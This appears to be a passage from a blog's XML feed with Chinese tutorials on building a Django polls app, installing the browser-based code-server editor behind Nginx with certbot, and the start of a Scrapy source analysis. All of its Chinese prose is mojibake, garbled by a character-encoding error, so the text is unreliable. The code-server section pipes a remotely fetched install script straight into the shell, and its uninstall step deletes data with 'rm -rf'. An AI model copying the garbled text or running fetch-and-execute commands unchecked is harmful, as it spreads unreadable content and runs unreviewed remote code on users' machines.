<p>Django æä¾›äº†ä»å…³è”å…³ç³» <em>å¦ä¸€è¾¹</em> è®¿é—®çš„ API â€”â€” ä»è¢«å…³è”æ¨¡å‹åˆ°å®šä¹‰å…³è”å…³ç³»çš„æ¨¡å‹çš„è¿æ¥ã€‚<br>å°±å¦‚ä¸Š, <code>question</code> å¯¹è±¡èƒ½é€šè¿‡ <code>choice_set</code> å±æ€§è®¿é—®åŒ…å«æ‰€æœ‰å…³è” <code>choice</code> å¯¹è±¡çš„åˆ—è¡¨ã€‚</p>
</blockquote>
<h3 id="æ·»åŠ æ¨¡æ¿"><a href="#æ·»åŠ æ¨¡æ¿" class="headerlink" title="æ·»åŠ æ¨¡æ¿"></a>æ·»åŠ æ¨¡æ¿</h3><p>ç„¶å, è®©æˆ‘ä»¬æ›´æ–°ä¸€ä¸‹ <code>polls/views.py</code> é‡Œçš„æ¥ä½¿ç”¨æ¨¡æ¿</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> loader</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    latest_question_list = Question.objects.order_by(<span class="string">&#x27;-pub_date&#x27;</span>)[:<span class="number">5</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å¯¼å…¥æ¨¡æ¿</span></span><br><span class="line">    template = loader.get_template(<span class="string">&#x27;polls/index.html&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># ä¼ é€’åˆ°æ¨¡æ¿é‡Œçš„ä¸Šä¸‹æ–‡</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;latest_question_list&#x27;</span>: latest_question_list,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.render(context, request))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ç§æ›´ä¼˜é›…çš„å†™æ³•, ä½¿ç”¨<code>django.shortcuts</code>å†…çš„<code>render()</code>å¿«æ·å‡½æ•°, æ¥ç®€åŒ–äº†<code>loader</code>å’Œ<code>HttpResponse</code>çš„ç¼–å†™æµç¨‹.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    latest_question_list = Question.objects.order_by(<span class="string">&#x27;-pub_date&#x27;</span>)[:<span class="number">5</span>]</span><br><span class="line">    context = &#123;<span class="string">&#x27;latest_question_list&#x27;</span>: latest_question_list&#125;</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/index.html&#x27;</span>, context)</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™å†çœ‹çœ‹é¡µé¢,æ˜¯ä¸æ˜¯æ ·å¼å°±å˜äº†å‘¢</p>
<img data-src="http://img.owq.world/2022/03/1151-83aa8f.png" style="zoom:80%;" />

<h3 id="å¤„ç†404"><a href="#å¤„ç†404" class="headerlink" title="å¤„ç†404"></a>å¤„ç†404</h3><p>é—®é¢˜idæ²¡æœ‰å¯¹åº”æ•°æ®æ—¶æŠ›å‡º404</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> Http404</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        question = Question.objects.get(pk=question_id)</span><br><span class="line">    <span class="keyword">except</span> Question.DoesNotExist:</span><br><span class="line">        <span class="keyword">raise</span> Http404(<span class="string">&quot;Question does not exist&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>

<p>åŒæ ·ä¹Ÿæœ‰æ›´ç®€æ´çš„å†™æ³•, ä½¿ç”¨<code>get_object_or_404()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> get_object_or_404, render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    question = get_object_or_404(Question, pk=question_id)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>â†‘ pk å‚æ•°è¡¨ç¤ºä¸»é”® &quot;primary key&quot;, æ˜¯ Django æä¾›æŸ¥è¯¢çš„å¿«æ·æ–¹å¼ â†‘ </p>
</blockquote>
<p>æµ‹è¯•ä¹‹å‰å…ˆä¿®æ”¹ä¸‹è®¾ç½®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DEBUG = <span class="literal">False</span>	<span class="comment"># å…³é—­è°ƒè¯•</span></span><br><span class="line"></span><br><span class="line">ALLOWED_HOSTS = [<span class="string">&#x27;127.0.0.1&#x27;</span>]	<span class="comment"># æ·»åŠ åˆæ³•ä¸»æœºåœ°å€</span></span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä¸€ä¸‹, é»˜è®¤è¿”å›ä¼šæ˜¯è¿™ä¸ªæ ·å­, ä½†å®é™…åº”ç”¨ä¸Šå¾ˆå°‘æœ‰ç½‘ç«™ä¼šç»™ç”¨æˆ·è¿”å›è¿™æ ·ç®€é™‹çš„é¡µé¢, ä¸€èˆ¬æ˜¯ä¼šåšé‡å®šå‘å¤„ç†çš„.</p>
<img data-src="http://img.owq.world/2022/03/1424-023cc2.png" style="zoom:80%;" />



<h3 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h3><p>ä½¿ç”¨<code>HttpResponseRedirect()</code>è¿›è¡Œé‡å®šå‘.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponseRedirect</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        question = Question.objects.get(pk=question_id)</span><br><span class="line">    <span class="keyword">except</span> Question.DoesNotExist:</span><br><span class="line">        <span class="comment"># é‡å®šå‘åˆ°ä¸»é¡µ</span></span><br><span class="line">        <span class="comment"># æ³¨æ„è¿™é‡Œå¦‚æœæŠ¥é”™æ‰¾ä¸åˆ°å‘½åç©ºé—´&#x27;polls&#x27;çš„è¯, è¦å»polls/urls.pyè®¾ç½®app_name=&#x27;polls&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> HttpResponseRedirect(reverse(<span class="string">&#x27;polls:index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="æŠ•ç¥¨åº”ç”¨"><a href="#æŠ•ç¥¨åº”ç”¨" class="headerlink" title="æŠ•ç¥¨åº”ç”¨"></a>æŠ•ç¥¨åº”ç”¨</h2><blockquote>
<p>æ¥ä¸‹æ¥å¯¹è¿™ä¸ªæŠ•ç¥¨åº”ç”¨è¿›è¡Œå®Œå–„, ç†Ÿæ‚‰ä¸‹æ•´ä½“æµç¨‹, æ¶‰åŠå…·ä½“çš„ç»†èŠ‚ä¹‹åå†æ·±å…¥.</p>
</blockquote>
<p>ä¿®æ”¹<code>polls/templates/polls/detail.html</code>, æ·»åŠ è¡¨å•å…ƒç´ .</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="comment">&#123;% comment %&#125; è¿™é‡Œä½¿ç”¨è½¯ç¼–ç , url ä»£è¡¨å½“å‰çš„åº”ç”¨å &#123;% endcomment %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;</span></span></span><span class="template-tag">&#123;% <span class="name"><span class="name">url</span></span> &#x27;polls:vote&#x27; question.id %&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">csrf_token</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">legend</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> error_message %&#125;</span><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span></span><span class="template-variable">&#123;&#123; error_message &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> choice <span class="keyword">in</span> question.choice_set.all %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;choice&quot;</span> <span class="attr">id</span>=<span class="string">&quot;choice</span></span></span><span class="template-variable">&#123;&#123; forloop.counter &#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span> <span class="attr">value</span>=<span class="string">&quot;</span></span></span><span class="template-variable">&#123;&#123; choice.id &#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;choice</span></span></span><span class="template-variable">&#123;&#123; forloop.counter &#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span></span><span class="template-variable">&#123;&#123; choice.choice_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Vote&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>polls/templates/polls/results.html</code>, æ˜¾ç¤ºæŠ•ç¥¨ç»“æœ.</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> choice <span class="keyword">in</span> question.choice_set.all %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123; choice.choice_text &#125;&#125;</span><span class="language-xml"> -- </span><span class="template-variable">&#123;&#123; choice.votes &#125;&#125;</span><span class="language-xml"> vote</span><span class="template-variable">&#123;&#123; choice.votes|<span class="name">pluralize</span> &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;</span></span></span><span class="template-tag">&#123;% <span class="name"><span class="name">url</span></span> &#x27;polls:detail&#x27; question.id %&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span>Vote again?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>vote()</code>æ–¹æ³•, å®ç°å®Œæ•´çš„æŠ•ç¥¨åŠŸèƒ½.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vote</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    question = get_object_or_404(Question, pk=question_id)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        selected_choice = question.choice_set.get(pk=request.POST[<span class="string">&#x27;choice&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> (KeyError, Choice.DoesNotExist):</span><br><span class="line">        <span class="comment"># æ²¡æœ‰é€‰æ‹©å›åˆ°è¡¨å•å¹¶æç¤ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&#x27;question&#x27;</span>: question,</span><br><span class="line">            <span class="string">&#x27;error_message&#x27;</span>: <span class="string">&quot;You didn&#x27;t select a choice.&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        selected_choice.votes += <span class="number">1</span></span><br><span class="line">        selected_choice.save()</span><br><span class="line">		<span class="comment"># æ•°æ®å¤„ç†æˆåŠŸè·³è½¬åˆ°resultsé¡µé¢</span></span><br><span class="line">        <span class="keyword">return</span> HttpResponseRedirect(reverse(<span class="string">&#x27;polls:results&#x27;</span>, args=(question.<span class="built_in">id</span>,)))</span><br></pre></td></tr></table></figure>

<p>åˆ°äº†è¿™ä¸€æ­¥, å…¶å®å·²ç»å®Œæˆäº†åŸºç¡€åŠŸèƒ½äº†, ä½†ä¸è¦å¿˜è®°äº†Questionå¯¹åº”Choiceè¿˜æ²¡æœ‰è¿›è¡Œåˆ›å»º.</p>
<p>ä¿®æ”¹<code>polls/admin.py</code>, é…ç½®åå°ç®¡ç†, ç”¨äºæ·»åŠ Choice.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Choice, Question</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChoiceInline</span>(admin.StackedInline):</span><br><span class="line">    model = Choice</span><br><span class="line">    extra = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuestionAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    fieldsets = [</span><br><span class="line">        (<span class="literal">None</span>,               &#123;<span class="string">&#x27;fields&#x27;</span>: [<span class="string">&#x27;question_text&#x27;</span>]&#125;),</span><br><span class="line">        (<span class="string">&#x27;Date information&#x27;</span>, &#123;<span class="string">&#x27;fields&#x27;</span>: [<span class="string">&#x27;pub_date&#x27;</span>], <span class="string">&#x27;classes&#x27;</span>: [<span class="string">&#x27;collapse&#x27;</span>]&#125;),</span><br><span class="line">    ]</span><br><span class="line">    inlines = [ChoiceInline]</span><br><span class="line"></span><br><span class="line">admin.site.register(Question, QuestionAdmin)</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥åå°ç®¡ç†, ä¿®æ”¹ç›¸åº”çš„é€‰é¡¹ä¿å­˜åå°±å¯ä»¥è¿›è¡Œæµ‹è¯•äº†.</p>
<p><img data-src="http://img.owq.world/2022/03/1708-84d281.png"></p>
<p>æµ‹è¯•ä¸€ä¸‹</p>
<p><img data-src="http://img.owq.world/2022/03/1712-601d4a.png"></p>
<blockquote>
<p>åˆ°æ­¤, ç®—æ˜¯å¯¹<code>Django</code>ç®€å•çš„å…¥äº†ä¸ªé—¨, ä¸‹ä¸€ç¯‡æ–‡ç« è¯¦ç»†è®²è®²<code>Django</code>ä¸­çš„æ¨¡å‹å±‚, è®©å’±ä»¬é€æ­¥æ·±å…¥ãƒ¾(â€¢Ï‰â€¢&#96;)o</p>
</blockquote>
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>åœ¨æµè§ˆå™¨ä¸Šä½¿ç”¨ vsCode è¿›è¡Œäº‘å¼€å‘</title>
    <url>/20130c79/</url>
    <content><![CDATA[<blockquote>
<p>é¡¹ç›®åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvZGVyL2NvZGUtc2VydmVy">https://github.com/coder/code-server</span><br>å®˜æ–¹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9jb2Rlci5jb20vZG9jcy9jb2RlLXNlcnZlci9sYXRlc3QvZ3VpZGU=">https://coder.com/docs/code-server/latest/guide</span></p>
</blockquote>
<h2 id="ç®€å•ä»‹ç»"><a href="#ç®€å•ä»‹ç»" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h2><p>ä¸ºäº†å®ç°åœ¨ç½‘é¡µä¸Šè¿›è¡Œäº‘å¼€å‘ï¼Œéœ€è¦ç”¨åˆ°<code>vsCode</code>å¼€å‘çš„ä¸€æ¬¾åˆ©å™¨<code>code-server</code>ï¼Œ å› ä¸º<code>vsCode</code>æ˜¯åŸºäº<code>Electron</code>å¼€å‘çš„ï¼Œè€Œ<code>Electron</code>æ˜¯ä¸€æ¬¾è·¨å¹³å°çš„ã€åŸºäº<code>Web</code>çš„æ¡Œé¢GUIåº”ç”¨ç¨‹åºå¼€å‘æ¡†æ¶ã€‚</p>
<p>æ‰€ä»¥<code>code-server</code>å°±æ˜¯ä¸€æ¬¾æŠŠ<code>vsCode</code>æ‰˜ç®¡æˆ<code>Web</code>æœåŠ¡æ¥è¾¾åˆ°äº‘å¼€å‘çš„åˆ©å™¨~</p>
<p><strong>éœ€è¦æ³¨æ„çš„ç‚¹</strong></p>
<ul>
<li><code>code-server</code>ç›®å‰ä¸æ”¯æŒç™»å½•è´¦å·è¿›è¡Œé…ç½®åŒæ­¥ã€‚</li>
<li><code>code-server</code>æœ¬èº«å°±æ˜¯è¿œç¨‹è¿æ¥ï¼Œå³ä¸æ”¯æŒä½¿ç”¨<code>ssh-remote</code>è¿›è¡Œå¥—å¨ƒè¿æ¥ï¼ˆæœªæ¥æœ‰è®¡åˆ’å¤„ç†ï¼‰ã€‚</li>
<li>éƒ¨åˆ†å¿«æ·é”®å’Œæµè§ˆå™¨æœ‰å†²çªï¼Œè¦ä¸å¤„ç†<code>vsCode</code>ï¼Œè¦ä¸å°±å¤„ç†æµè§ˆå™¨ã€‚</li>
<li>ä½¿ç”¨æ—¶ä¼šè·å–æœåŠ¡å™¨æƒé™ï¼Œæš´éœ²ç«¯å£éœ€åšå¥½å®‰å…¨æªè¾ï¼Œé˜²æ­¢æ„å¤–ã€‚</li>
<li>ç»¼ä¸Šï¼Œè¦åœ¨<code>code-server</code>è¿›è¡Œæ—¥å¸¸å¼€å‘éœ€è¦å¤§é‡é…ç½®ï¼Œé’ˆå¯¹æ€§åœºæ™¯è¾ƒå¼ºï¼ˆæ²¡æœ‰ç”µè„‘çš„æƒ…å†µä¸‹ï¼‰ã€‚</li>
</ul>
<h2 id="è„šæœ¬å®‰è£…"><a href="#è„šæœ¬å®‰è£…" class="headerlink" title="è„šæœ¬å®‰è£…"></a>è„šæœ¬å®‰è£…</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å…ˆè¿è¡Œä¸‹æµ‹è¯•ï¼Œè¿™æ¡å‘½ä»¤åªæ˜¯è¾“å‡ºæ‰§è¡Œå®‰è£…æ­¥éª¤ï¼Œä¸ä¼šè¿›è¡Œå®‰è£…ã€‚</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//</span>code-server.dev/install.sh | sh -s -- --dry-run</span><br></pre></td></tr></table></figure>

<p><img data-src="http://img.owq.world/2022/01/2116-18d0a8.png"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸‹è½½äº†<code>code-server_4.0.1_amd64.deb</code>åŒ…åˆ°<code>~/.cache/code-server/</code>ä¸‹ç„¶åç»§ç»­å®‰è£…å°±å®Œäº‹äº†ã€‚<br>äº†è§£äº†ä¸‹è„šæœ¬åšçš„äº‹ï¼Œæ¥ä¸‹æ¥ç›´æ¥å®‰è£…å°±è¡Œäº†ã€‚</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//</span>code-server.dev/install.sh | sh</span><br></pre></td></tr></table></figure>

<p><img data-src="http://img.owq.world/2022/01/1253-9d7fca.png"></p>
<p>è¿™é‡Œä½ ä¼šå¯èƒ½ä¼šé‡åˆ°<code>github</code>è¢«å¢™å¯¼è‡´ä¸‹è½½ä¸è¾½æˆ–è€…ä¸‹è½½ç¼“æ…¢çš„é—®é¢˜ï¼Œè¿™æ—¶é…ç½®ä¸‹<code>/etc/ssh/ssh_config</code>ä¸­çš„<code>GSSAPIAuthentication</code>è®¾ç½®ä¸º<code>no</code>ä¸€èˆ¬å°±èƒ½è§£å†³é—®é¢˜ï¼Œè§£å†³ä¸è¾½é—®é¢˜çš„è¯å°±åªèƒ½ä½¿ç”¨ç§‘å­¦çš„é­”æ³•äº†~</p>
<h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">vim ~<span class="regexp">/.config/</span>code-server/config.yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bind-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8080</span>	<span class="comment"># è½¬å‘ipå’Œç«¯å£</span></span><br><span class="line"><span class="attr">auth:</span> <span class="string">password</span>	<span class="comment"># æ˜¯å¦å¯ç”¨éªŒè¯</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">***</span>	<span class="comment"># ç™»å½•å¯†ç </span></span><br><span class="line"><span class="attr">cert:</span> <span class="literal">false</span>	<span class="comment"># è¯ä¹¦éªŒè¯</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now code-server@<span class="variable">$USER</span></span><br></pre></td></tr></table></figure>

<h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>å…ˆä½¿ç”¨<code>ssh</code>è½¬å‘åˆ°æœ¬åœ°ç«¯å£åï¼Œæµè§ˆå™¨æ‰“å¼€<code>http://localhost:8080</code>è¿›å…¥ç™»å½•é¡µé¢</p>
<p><img data-src="http://img.owq.world/2022/01/1658-ae2061.png" alt="image-20220107165822570"></p>
<p>è¾“å…¥å¯†ç ç™»å½•åå°±å¯ä»¥çœ‹åˆ°ç†Ÿæ‚‰çš„å¼€å§‹é¡µé¢äº†~</p>
<p><img data-src="http://img.owq.world/2022/01/1706-df356f.png"></p>
<p>å…ˆä¸æ€¥ï¼Œä¸ºäº†è®©å¤§éƒ¨åˆ†å¿«æ·é”®å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œå…ˆæŠŠç½‘é¡µæ·»åŠ æˆåº”ç”¨<br><img data-src="http://img.owq.world/2022/01/1717-2a8ff3.png"></p>
<img data-src="http://img.owq.world/2022/01/1714-27070f.png" style="zoom: 50%;" />

<p>ä¹‹åå°±å¼€å§‹é…ç½®ä½ çš„<code>vsCode</code>å§~</p>
<h2 id="æš´éœ²å…¬ç½‘"><a href="#æš´éœ²å…¬ç½‘" class="headerlink" title="æš´éœ²å…¬ç½‘"></a>æš´éœ²å…¬ç½‘</h2><blockquote>
<p>å®˜æ–¹æ¨èä½¿ç”¨<code>SSH</code>è¿›è¡Œè½¬å‘è¿æ¥ï¼Œè¿™ç§è¿æ¥æ–¹å¼æ˜¯æœ€å®‰å…¨çš„ï¼Œä½†å®é™…æƒ…å†µåè€Œæµè§ˆå™¨ä½¿ç”¨ç‡é«˜ï¼Œæ‰€ä»¥é‡‡ç”¨åŸŸå+httpsçš„æ–¹å¼æ¥è¿›è¡Œå®‰å…¨è¿æ¥ã€‚</p>
</blockquote>
<h3 id="Nginx-ä»£ç†è½¬å‘"><a href="#Nginx-ä»£ç†è½¬å‘" class="headerlink" title="Nginx ä»£ç†è½¬å‘"></a>Nginx ä»£ç†è½¬å‘</h3><p>è¿™é‡Œä½¿ç”¨<code>Nginx</code>è¿›è¡Œä»£ç†è½¬å‘ï¼Œå…·ä½“é…ç½®è¯·<strong>ä¾è‡ªèº«æƒ…å†µè¿›è¡Œä¿®æ”¹</strong>ã€‚<br>ä½¿ç”¨<code>certbot</code>æ·»åŠ è¯ä¹¦éªŒè¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…certbot</span></span><br><span class="line">sudo apt install -y certbot python3-certbot-nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè¯ä¹¦ å¹¶è‡ªåŠ¨é…ç½® Nginx</span></span><br><span class="line">sudo certbot --non-interactive --redirect --agree-tos --nginx -d [åŸŸå] -m [é‚®ç®±]</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„é…ç½®åº”è¯¥æ˜¯è¿™æ ·å­</p>
<p><img data-src="http://img.owq.world/2022/01/2205-ba41b1.png"></p>
<p>é‡è½½<code>nginx</code>åº”ç”¨é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t <span class="comment"># æµ‹è¯•</span></span><br><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶ä½¿ç”¨åŸŸåå°±å¯ä»¥ç›´æ¥è®¿é—®<code>vsCode</code>äº†</p>
<h2 id="å®Œå…¨å¸è½½"><a href="#å®Œå…¨å¸è½½" class="headerlink" title="å®Œå…¨å¸è½½"></a>å®Œå…¨å¸è½½</h2><blockquote>
<p>é€šè¿‡åˆ é™¤åº”ç”¨ç¨‹åºç›®å½•å’Œç”¨æˆ·é…ç½®ç›®å½•ï¼Œå¯ä»¥å®Œå…¨å¸è½½<code>server-code</code>ã€‚</p>
</blockquote>
<p>å¸è½½ç¨‹åº</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt <span class="built_in">remove</span> code-server</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤è®¾ç½®å’Œæ•°æ®</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">rm -rf ~<span class="regexp">/.local/</span>share/code-server ~<span class="regexp">/.config/</span>code-server</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤å®‰è£…åŒ…</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">rm -rf ~<span class="regexp">/.cache/</span>code-server</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æŠ€æœ¯è®°å½•</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>vsCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapy å¯åŠ¨æºç åˆ†æ</title>
    <url>/66180b04/</url>
    <content><![CDATA[<blockquote>
<p>ç¯å¢ƒ: Python 3.9<br>ç‰ˆæœ¬: Scrapy 2.5.1<br>IDE: vsCode</p>
</blockquote>
